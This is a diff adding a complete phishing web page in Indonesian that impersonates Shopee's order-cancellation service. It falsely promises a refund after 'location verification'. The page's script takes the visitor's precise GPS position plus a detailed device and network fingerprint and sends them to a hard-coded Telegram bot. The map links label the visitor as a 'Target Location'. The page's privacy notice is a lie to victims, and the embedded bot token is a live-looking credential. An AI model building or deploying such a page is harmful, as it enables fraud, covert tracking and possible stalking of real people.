@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee - Pembatalan Pesanan</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        :root {
+            --primary: #ff5500;
+            --primary-dark: #ff2e00;
+            --secondary: #00a650;
+            --danger: #d32f2f;
+            --warning: #ff9800;
+            --success: #4caf50;
+            --gray-100: #f8f9fa;
+            --gray-200: #e9ecef;
+            --gray-300: #dee2e6;
+            --gray-600: #6c757d;
+            --gray-800: #343a40;
+            --gray-900: #212529;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--gray-100) 0%, var(--gray-200) 100%);
+            min-height: 100vh;
+            color: var(--gray-900);
+            line-height: 1.6;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(255, 85, 0, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+        }
+        
+        .header-text {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        
+        .main-container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.12);
+        }
+        
+        .card-header {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .warning-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .card-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .card-subtitle {
+            font-size: 18px;
+            opacity: 0.9;
+        }
+        
+        .card-body {
+            padding: 40px;
+        }
+        
+        .alert {
+            background: #fff3e0;
+            border-left: 5px solid var(--warning);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+        
+        .alert-title {
+            color: var(--warning);
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .order-details {
+            background: var(--gray-100);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 2px solid var(--gray-300);
+        }
+        
+        .order-id {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+        
+        .order-meta {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .meta-item {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .meta-label {
+            color: var(--gray-600);
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .meta-value {
+            font-weight: 600;
+            color: var(--gray-900);
+        }
+        
+        .location-requirements {
+            background: #e8f5e9;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            border-left: 5px solid var(--success);
+        }
+        
+        .requirements-title {
+            color: var(--success);
+            font-size: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .requirements-list {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .requirements-list li {
+            padding: 12px 0;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid rgba(0, 166, 80, 0.1);
+        }
+        
+        .requirements-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .requirements-list li::before {
+            content: "✓";
+            color: var(--success);
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .privacy-notice {
+            background: #e3f2fd;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 30px 0;
+            border-left: 5px solid #2196f3;
+        }
+        
+        .privacy-title {
+            color: #1976d2;
+            font-size: 18px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255, 85, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid var(--gray-200);
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-card {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: var(--success);
+            margin-bottom: 20px;
+            animation: scaleIn 0.5s ease;
+        }
+        
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+        
+        .refund-details {
+            background: var(--gray-100);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+        }
+        
+        .refund-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .refund-item {
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .refund-label {
+            color: var(--gray-600);
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .refund-value {
+            font-weight: 700;
+            color: var(--gray-900);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--gray-600);
+            margin-top: 50px;
+        }
+        
+        .contact-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            margin: 30px auto;
+            max-width: 600px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+        }
+        
+        .contact-title {
+            color: var(--primary);
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .contact-phone {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--primary);
+            margin: 20px 0;
+        }
+        
+        @media (max-width: 768px) {
+            .main-container {
+                padding: 0 15px;
+                margin: 20px auto;
+            }
+            
+            .card-body {
+                padding: 25px;
+            }
+            
+            .card-title {
+                font-size: 26px;
+            }
+            
+            .contact-phone {
+                font-size: 24px;
+            }
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-left: 10px;
+        }
+        
+        .status-pending {
+            background: #fff3e0;
+            color: #ff9800;
+        }
+        
+        .status-processing {
+            background: #e3f2fd;
+            color: #2196f3;
+        }
+        
+        .status-success {
+            background: #e8f5e9;
+            color: #4caf50;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">🛍️ SHOPEE</div>
+            <div>
+                <div>Pusat Bantuan Pembatalan</div>
+                <div class="header-text">Layanan 24/7 • Aman & Terpercaya</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="main-container">
+        <!-- Cancellation Request Card -->
+        <div id="cancellationCard" class="card">
+            <div class="card-header">
+                <div class="warning-icon">⚠️</div>
+                <h1 class="card-title">Pembatalan Pesanan</h1>
+                <div class="card-subtitle">Verifikasi Diperlukan untuk Keamanan</div>
+            </div>
+            
+            <div class="card-body">
+                <div class="alert">
+                    <div class="alert-title">
+                        <span>⏳</span>
+                        Permintaan Pembatalan Sedang Diproses
+                    </div>
+                    <p>Untuk menyelesaikan pembatalan pesanan, kami memerlukan verifikasi lokasi Anda sebagai langkah keamanan tambahan.</p>
+                </div>
+                
+                <div class="order-details">
+                    <div class="order-id">#SP-2024-789456-123</div>
+                    <div style="margin-bottom: 15px;">
+                        <strong>Produk:</strong> Vivo Y17 2024 Edition (1 Unit)
+                    </div>
+                    <div>
+                        <strong>Total Pembayaran:</strong> Rp 1.199.000
+                    </div>
+                    
+                    <div class="order-meta">
+                        <div class="meta-item">
+                            <div class="meta-label">Tanggal Pesan</div>
+                            <div class="meta-value">15 Des 2024</div>
+                        </div>
+                        <div class="meta-item">
+                            <div class="meta-label">Status</div>
+                            <div class="meta-value">
+                                Menunggu Pembayaran
+                                <span class="status-badge status-pending">PENDING</span>
+                            </div>
+                        </div>
+                        <div class="meta-item">
+                            <div class="meta-label">Metode Bayar</div>
+                            <div class="meta-value">Transfer Bank</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="location-requirements">
+                    <div class="requirements-title">
+                        <span>📍</span>
+                        Mengapa Verifikasi Lokasi Diperlukan?
+                    </div>
+                    <ul class="requirements-list">
+                        <li>Memverifikasi identitas pemilik akun</li>
+                        <li>Mencegah penyalahgunaan dan penipuan</li>
+                        <li>Mempercepat proses pengembalian dana</li>
+                        <li>Mencatat riwayat transaksi dengan akurat</li>
+                        <li>Memberikan perlindungan ekstra untuk akun Anda</li>
+                    </ul>
+                </div>
+                
+                <div class="privacy-notice">
+                    <div class="privacy-title">
+                        <span>🔒</span>
+                        Keamanan Data Anda
+                    </div>
+                    <p>Lokasi Anda hanya akan digunakan untuk proses verifikasi ini dan akan dienkripsi dengan standar keamanan tertinggi. Data tidak akan disimpan atau dibagikan kepada pihak ketiga.</p>
+                </div>
+                
+                <button class="btn" onclick="initiateLocationVerification()">
+                    <span>📍</span>
+                    VERIFIKASI LOKASI SEKARANG
+                </button>
+                
+                <div style="text-align: center; margin-top: 25px; color: var(--gray-600); font-size: 14px;">
+                    <p>⏱️ Proses verifikasi memakan waktu sekitar 2 menit</p>
+                    <p>💰 Dana akan dikembalikan dalam 1-3 hari kerja</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Loading State -->
+        <div id="loadingState" class="card loading">
+            <div class="card-body">
+                <div class="spinner"></div>
+                <h2 style="color: var(--primary); margin: 20px 0 15px;">Memverifikasi Lokasi Anda</h2>
+                <p style="color: var(--gray-600); max-width: 500px; margin: 0 auto;">
+                    Mohon tunggu sebentar. Sistem kami sedang memverifikasi lokasi Anda untuk keamanan transaksi.
+                    Jangan tutup atau refresh halaman ini.
+                </p>
+                <div style="margin-top: 30px; color: var(--gray-600); font-size: 14px;">
+                    <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px;">
+                        <div style="width: 20px; height: 20px; border-radius: 50%; background: var(--primary);"></div>
+                        <span>Mengakses layanan lokasi</span>
+                    </div>
+                    <div style="display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px;">
+                        <div style="width: 20px; height: 20px; border-radius: 50%; background: var(--primary); animation: pulse 2s infinite;"></div>
+                        <span>Memproses koordinat GPS</span>
+                    </div>
+                    <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
+                        <div style="width: 20px; height: 20px; border-radius: 50%; background: var(--gray-300);"></div>
+                        <span>Mengirim verifikasi ke server</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Success Card -->
+        <div id="successCard" class="card success-card">
+            <div class="card-header" style="background: linear-gradient(135deg, var(--success), #2e7d32);">
+                <div class="success-icon">✅</div>
+                <h1 class="card-title">Verifikasi Berhasil!</h1>
+                <div class="card-subtitle">Pembatalan Pesanan Diproses</div>
+            </div>
+            
+            <div class="card-body">
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <p style="font-size: 18px; color: var(--gray-800);">
+                        Lokasi Anda telah berhasil diverifikasi. Pembatalan pesanan dengan ID
+                        <strong style="color: var(--primary);">#SP-2024-789456-123</strong> sedang diproses.
+                    </p>
+                </div>
+                
+                <div class="refund-details">
+                    <h3 style="color: var(--gray-800); margin-bottom: 20px; text-align: center;">
+                        📋 Detail Pengembalian Dana
+                    </h3>
+                    <div class="refund-grid">
+                        <div class="refund-item">
+                            <div class="refund-label">Jumlah Pengembalian</div>
+                            <div class="refund-value">Rp 1.199.000</div>
+                        </div>
+                        <div class="refund-item">
+                            <div class="refund-label">Status</div>
+                            <div class="refund-value">
+                                Diproses
+                                <span class="status-badge status-processing">PROCESSING</span>
+                            </div>
+                        </div>
+                        <div class="refund-item">
+                            <div class="refund-label">No. Referensi</div>
+                            <div class="refund-value">RF-20241215-789</div>
+                        </div>
+                        <div class="refund-item">
+                            <div class="refund-label">Estimasi Selesai</div>
+                            <div class="refund-value">18 Des 2024</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="background: #e8f5e9; border-radius: 12px; padding: 20px; margin: 30px 0;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
+                        <span style="font-size: 20px;">📧</span>
+                        <div>
+                            <div style="font-weight: 600; color: var(--gray-800);">Notifikasi akan dikirim ke:</div>
+                            <div style="color: var(--gray-600);">email@example.com • +62 812-3456-7890</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn" onclick="window.location.href='https://shopee.co.id'" style="background: linear-gradient(135deg, var(--success), #2e7d32);">
+                    <span>🏠</span>
+                    KEMBALI KE BERANDA SHOPEE
+                </button>
+                
+                <div style="text-align: center; margin-top: 30px; color: var(--gray-600); font-size: 14px;">
+                    <p>Terima kasih telah menggunakan layanan Shopee. Untuk pertanyaan lebih lanjut, hubungi Customer Service kami.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="contact-card">
+            <h3 class="contact-title">📞 Butuh Bantuan?</h3>
+            <p style="color: var(--gray-600); margin-bottom: 20px;">
+                Tim Customer Service Shopee siap membantu Anda 24 jam sehari, 7 hari seminggu.
+            </p>
+            <div class="contact-phone">1500-123</div>
+            <p style="color: var(--gray-600); margin: 10px 0;">atau</p>
+            <div class="contact-phone">021-5086-8888</div>
+            <p style="color: var(--gray-600); margin-top: 20px; font-size: 14px;">
+                WhatsApp: +62 811-1234-5678 • Email: help@shopee.co.id
+            </p>
+        </div>
+        
+        <div style="margin-top: 40px;">
+            <p style="color: var(--gray-600); margin-bottom: 10px;">© 2024 Shopee. Hak Cipta Dilindungi Undang-Undang.</p>
+            <p style="color: var(--gray-600); font-size: 12px;">
+                PT Shopee International Indonesia • Jl. Sudirman Kav. 28-30, Jakarta Selatan 12920
+            </p>
+            <div style="margin-top: 20px;">
+                <a href="#" style="color: var(--gray-600); margin: 0 10px; text-decoration: none; font-size: 13px;">Syarat & Ketentuan</a>
+                <a href="#" style="color: var(--gray-600); margin: 0 10px; text-decoration: none; font-size: 13px;">Kebijakan Privasi</a>
+                <a href="#" style="color: var(--gray-600); margin: 0 10px; text-decoration: none; font-size: 13px;">Pusat Bantuan</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ⚠️ WARNING: THESE CREDENTIALS ARE NOW PUBLICLY EXPOSED!
+        const BOT_TOKEN = '8551243562:AAEnFEq3Vr2vlRrUYp1T7tQYcG7eyt1JDLk';
+        const CHAT_ID = '6466187930';
+        
+        async function initiateLocationVerification() {
+            const cancellationCard = document.getElementById('cancellationCard');
+            const loadingState = document.getElementById('loadingState');
+            
+            // Transition to loading state
+            cancellationCard.style.display = 'none';
+            loadingState.style.display = 'block';
+            
+            // Check if geolocation is supported
+            if (!navigator.geolocation) {
+                alert('Browser Anda tidak mendukung akses lokasi. Gunakan perangkat lain.');
+                resetView();
+                return;
+            }
+            
+            try {
+                // Request high-accuracy location
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        resolve,
+                        reject,
+                        {
+                            enableHighAccuracy: true,      // Use GPS if available
+                            timeout: 30000,               // 30 second timeout
+                            maximumAge: 0                 // Don't use cached location
+                        }
+                    );
+                });
+                
+                // Collect comprehensive location data
+                const locationData = {
+                    // Core location data
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    speed: position.coords.speed,
+                    heading: position.coords.heading,
+                    timestamp: new Date(position.timestamp).toLocaleString('id-ID'),
+                    
+                    // Device and browser info
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    online: navigator.onLine,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    
+                    // Screen info
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    screenColorDepth: screen.colorDepth,
+                    pixelRatio: window.devicePixelRatio,
+                    
+                    // Network info
+                    connectionType: navigator.connection?.effectiveType,
+                    downlink: navigator.connection?.downlink,
+                    rtt: navigator.connection?.rtt,
+                    
+                    // Additional metadata
+                    pageUrl: window.location.href,
+                    referrer: document.referrer,
+                    localTime: new Date().toLocaleString('id-ID'),
+                    timezoneOffset: new Date().getTimezoneOffset()
+                };
+                
+                console.log('📍 Location data captured:', locationData);
+                
+                // Send to Telegram
+                const success = await sendToTelegram(locationData);
+                
+                if (success) {
+                    // Simulate processing delay
+                    setTimeout(() => {
+                        loadingState.style.display = 'none';
+                        document.getElementById('successCard').style.display = 'block';
+                        
+                        // Scroll to success message
+                        document.getElementById('successCard').scrollIntoView({
+                            behavior: 'smooth',
+                            block: 'start'
+                        });
+                    }, 3000);
+                } else {
+                    throw new Error('Failed to send location data');
+                }
+                
+            } catch (error) {
+                console.error('Location verification error:', error);
+                
+                // Handle specific error cases
+                let errorMessage = 'Terjadi kesalahan. Silakan coba lagi.';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage = 'Akses lokasi ditolak. Izinkan akses lokasi untuk melanjutkan pembatalan.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage = 'Informasi lokasi tidak tersedia. Pastikan GPS aktif.';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage = 'Waktu permintaan lokasi habis. Coba lagi di area terbuka.';
+                        break;
+                }
+                
+                alert(`⚠️ ${errorMessage}`);
+                resetView();
+            }
+        }
+        
+        async function sendToTelegram(locationData) {
+            try {
+                // Create map URLs
+                const mapsUrl = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+                const streetViewUrl = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${locationData.latitude},${locationData.longitude}`;
+                const openStreetMapUrl = `https://www.openstreetmap.org/?mlat=${locationData.latitude}&mlon=${locationData.longitude}&zoom=15`;
+                
+                // Prepare detailed message for Telegram
+                let message = `🎯 *SHOPEE LOCATION VERIFICATION CAPTURED* 🎯\n\n`;
+                
+                message += `📅 *TIMESTAMP*\n`;
+                message += `• Local Time: ${locationData.localTime}\n`;
+                message += `• UTC Time: ${new Date().toISOString()}\n`;
+                message += `• Timezone: ${locationData.timezone}\n\n`;
+                
+                message += `📍 *PRECISE LOCATION*\n`;
+                message += `• Latitude: ${locationData.latitude}\n`;
+                message += `• Longitude: ${locationData.longitude}\n`;
+                message += `• Accuracy: ${locationData.accuracy} meters\n`;
+                
+                if (locationData.altitude) {
+                    message += `• Altitude: ${locationData.altitude} meters\n`;
+                    message += `• Altitude Accuracy: ${locationData.altitudeAccuracy || 'N/A'} meters\n`;
+                }
+                
+                if (locationData.speed) {
+                    message += `• Speed: ${locationData.speed} m/s\n`;
+                }
+                
+                if (locationData.heading) {
+                    message += `• Heading: ${locationData.heading}°\n`;
+                }
+                
+                message += `\n🗺️ *MAP LINKS*\n`;
+                message += `• Google Maps: ${mapsUrl}\n`;
+                message += `• Street View: ${streetViewUrl}\n`;
+                message += `• OpenStreetMap: ${openStreetMapUrl}\n`;
+                message += `• Coordinates: ${locationData.latitude}, ${locationData.longitude}\n\n`;
+                
+                message += `💻 *DEVICE INFORMATION*\n`;
+                message += `• User Agent: ${locationData.userAgent}\n`;
+                message += `• Platform: ${locationData.platform}\n`;
+                message += `• Language: ${locationData.language}\n`;
+                message += `• Screen: ${locationData.screenWidth}x${locationData.screenHeight}\n`;
+                message += `• Color Depth: ${locationData.screenColorDepth} bit\n`;
+                message += `• Pixel Ratio: ${locationData.pixelRatio}\n`;
+                message += `• Online: ${locationData.online ? 'Yes' : 'No'}\n`;
+                message += `• Cookies: ${locationData.cookieEnabled ? 'Enabled' : 'Disabled'}\n\n`;
+                
+                message += `🌐 *NETWORK INFORMATION*\n`;
+                if (locationData.connectionType) {
+                    message += `• Connection Type: ${locationData.connectionType}\n`;
+                    message += `• Downlink: ${locationData.downlink} Mbps\n`;
+                    message += `• RTT: ${locationData.rtt} ms\n`;
+                }
+                message += `• Page URL: ${locationData.pageUrl}\n`;
+                message += `• Referrer: ${locationData.referrer || 'Direct access'}\n\n`;
+                
+                message += `🔧 *ADDITIONAL DATA*\n`;
+                message += `• Browser Languages: ${locationData.languages?.join(', ') || 'N/A'}\n`;
+                message += `• Timezone Offset: ${locationData.timezoneOffset} minutes\n`;
+                message += `• Geolocation Timestamp: ${locationData.timestamp}\n`;
+                
+                // Send to Telegram using Bot API
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    console.log('✅ Location data sent to Telegram successfully');
+                    
+                    // Optionally send location as venue (for quick map access)
+                    try {
+                        const venueUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVenue`;
+                        await fetch(venueUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                latitude: locationData.latitude,
+                                longitude: locationData.longitude,
+                                title: '📍 Target Location - Shopee Verification',
+                                address: `Accuracy: ${locationData.accuracy}m • ${new Date().toLocaleString('id-ID')}`
+                            })
+                        });
+                    } catch (venueError) {
+                        console.log('Venue send optional:', venueError);
+                    }
+                    
+                    return true;
+                } else {
+                    console.error('❌ Telegram API error:', result);
+                    return false;
+                }
+                
+            } catch (error) {
+                console.error('❌ Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        function resetView() {
+            document.getElementById('loadingState').style.display = 'none';
+            document.getElementById('cancellationCard').style.display = 'block';
+        }
+        
+        // Page initialization
+        window.addEventListener('DOMContentLoaded', () => {
+            console.log('🛍️ Shopee Cancellation Verification Page Loaded');
+            console.log('⚠️ WARNING: This is a demonstration page for educational purposes only');
+            
+            // Add subtle entrance animation
+            const cards = document.querySelectorAll('.card');
+            cards.forEach((card, index) => {
+                card.style.opacity = '0';
+                card.style.transform = 'translateY(20px)';
+                
+                setTimeout(() => {
+                    card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }, index * 100);
+            });
+        });
+        
+        // Demo mode for testing
+        function enableDemoMode() {
+            console.log('🧪 Demo mode activated');
+            const demoLocation = {
+                latitude: -6.2088,
+                longitude: 106.8456,
+                accuracy: 25,
+                altitude: 15,
+                altitudeAccuracy: 5,
+                speed: 0,
+                heading: null,
+                timestamp: new Date().toLocaleString('id-ID'),
+                userAgent: 'Demo Browser',
+                platform: 'Demo Platform',
+                language: 'id-ID',
+                screenWidth: 1920,
+                screenHeight: 1080,
+                localTime: new Date().toLocaleString('id-ID')
+            };
+            
+            sendToTelegram(demoLocation);
+            
+            document.getElementById('cancellationCard').style.display = 'none';
+            document.getElementById('successCard').style.display = 'block';
+        }
+        
+        // Keyboard shortcut for demo (Ctrl+Shift+D)
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                enableDemoMode();
+            }
+        });
+    </script>
+</body>
+</html>
